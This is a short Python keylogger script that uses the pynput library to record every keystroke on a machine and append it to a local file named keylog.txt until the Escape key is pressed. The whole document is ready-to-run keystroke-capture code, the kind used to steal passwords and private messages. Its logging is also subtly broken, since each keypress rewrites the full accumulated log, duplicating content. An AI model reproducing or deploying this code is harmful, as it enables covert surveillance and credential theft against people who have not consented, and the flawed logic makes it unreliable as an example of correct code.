import pynput.keyboard

# Global variable to store pressed keys
log = ""

# Function to write the keystrokes to a file
def write_log(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    # Write the keystrokes to the log file
    with open("keylog.txt", "a") as f:
        f.write(log)

# Function to handle key presses
def on_press(key):
    global log
    write_log(key)

# Function to handle key releases
def on_release(key):
    if key == pynput.keyboard.Key.esc:  # Stop listener if the ESC key is pressed
        return False

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
